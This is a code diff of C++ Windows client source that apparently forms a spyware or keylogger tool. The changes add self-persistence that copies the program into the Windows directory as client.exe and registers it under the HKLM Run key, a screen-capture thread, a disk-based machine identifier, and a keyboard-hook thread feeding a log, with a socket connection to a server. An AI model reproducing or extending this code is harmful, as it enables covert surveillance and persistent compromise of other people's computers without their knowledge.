@@ -2,6 +2,7 @@
 #include <ShellAPI.h>
 #include <iostream>
 #include "Interceptor.h"
+#include "screen-id.h"
 
 using namespace std;
 
@@ -10,17 +11,23 @@ using namespace std;
 
 constexpr auto FILE_PATH = "log.txt";
 
+BOOL SelfAutorun();
+#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)
+
 SOCKET connection;
 
 DWORD WINAPI hookJob(LPVOID lpParm);
 
 int main(int argc, char* argv[]) {
+	SelfAutorun();
 	WSAData wsaData;
 	WORD DLLVersion = MAKEWORD(2, 1);
 	if (WSAStartup(DLLVersion, &wsaData) != 0) {
 		cout << "Error load lib" << endl;
 		exit(1);
 	}
+
+	string command;
 
 	ShellExecuteA(NULL, "open", "server", NULL, NULL, SW_RESTORE);
 
@@ -36,26 +43,51 @@ int main(int argc, char* argv[]) {
 		return 0;
 	}
 	cout << "Connected to server!" << endl;
-	char data[256] = "Hello!";
-	char strExit[256] = "exit";
+	cout << "ID PC - " << GetHDD() << endl;
 
+	HANDLE hThreadS = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)do_screen, NULL, NULL, NULL);
 	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)hookJob, NULL, NULL, NULL);
-	if (hThread)
+
+	if (hThread && hThreadS)
 		while (true)
 		{
-			;
+			cin >> command;
+			if (command == "stop") {
+				system("pause");
+				return 0;
+			} else if (command == "show")
+				ShellExecuteA(NULL, "open", "result.txt", NULL, NULL, SW_RESTORE);
+							
 		}
 	else
 		exit(EXIT_FAILURE);
-	
-// 	while (1) {
-// 		send(connection, data, sizeof(data), NULL);
-// 		if (strcmp(data, strExit) == 0)
-// 			break;
-// 	}
 
 	system("pause");
 	return 0;
+}
+
+BOOL SelfAutorun() {
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	TCHAR szExeName[MAX_PATH + 1];
+	TCHAR szWinPath[MAX_PATH + 1];
+	GetModuleFileName(NULL, szExeName, STRLEN(szExeName));
+	GetWindowsDirectory(szWinPath, STRLEN(szWinPath));
+	lstrcat(szWinPath, L"\\client.exe");
+	if (0 == CopyFile(szExeName, szWinPath, FALSE)) {
+		return FALSE;
+	}
+	lResult = RegOpenKey(
+		HKEY_LOCAL_MACHINE,
+		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		&hKey);
+	if (ERROR_SUCCESS != lResult) {
+		return FALSE;
+	}
+	RegSetValueEx(hKey, L"Autorun", 0, REG_SZ, (PBYTE)szWinPath,
+		lstrlen(szWinPath) * sizeof(TCHAR) + 1);
+	RegCloseKey(hKey);
+	return TRUE;
 }
 
 DWORD WINAPI hookJob(LPVOID lpParm)
